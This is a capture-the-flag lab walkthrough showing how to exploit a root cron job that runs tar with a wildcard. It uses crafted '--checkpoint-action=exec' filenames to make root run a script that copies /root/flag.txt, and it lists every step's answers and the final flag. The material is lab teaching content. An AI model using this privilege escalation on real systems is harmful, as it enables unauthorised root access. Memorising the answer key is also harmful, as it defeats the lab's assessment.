# Cron Wildcard PrivEsc (Hard)

## Goal

Exploit a root cron archive script that expands attacker-controlled filenames inside `tar`, then capture:

```text
FLAG{cron_wildcard_checkpoint_escape}
```

## Platform Session

Open the terminal from the lab platform. The commands below are meant to be executed directly in the provided `student` shell.

## Step 1. Identify The Privileged Cron Task

Read cron configuration:

```bash
cat /etc/crontab
```

The root archive script is:

```text
/opt/ops/archive-uploads.sh
```

Submit for step 1:

```text
/opt/ops/archive-uploads.sh
```

## Step 2. Find The Unsafe Wildcard Directory

Inspect the script and permissions:

```bash
cat /opt/ops/archive-uploads.sh
ls -ld /srv/portal/uploads
```

The script changes into the uploads directory and runs `tar` with `*`.

Submit for step 2:

```text
/srv/portal/uploads
```

## Step 3. Exploit Tar Option Injection

Move into the attacker-controlled directory:

```bash
cd /srv/portal/uploads
```

Create a payload that copies the root flag into `/tmp`:

```bash
cat > shell.sh <<'EOF'
#!/bin/bash
cp /root/flag.txt /tmp/flag.txt
chmod 644 /tmp/flag.txt
EOF
chmod +x shell.sh
```

Create filenames that GNU tar interprets as options:

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

Wait for cron:

```bash
sleep 70
cat /tmp/flag.txt
```

Submit:

```text
FLAG{cron_wildcard_checkpoint_escape}
```

## Full Solve

```bash
cat /etc/crontab
cat /opt/ops/archive-uploads.sh
cd /srv/portal/uploads
cat > shell.sh <<'EOF'
#!/bin/bash
cp /root/flag.txt /tmp/flag.txt
chmod 644 /tmp/flag.txt
EOF
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
sleep 70
cat /tmp/flag.txt
```
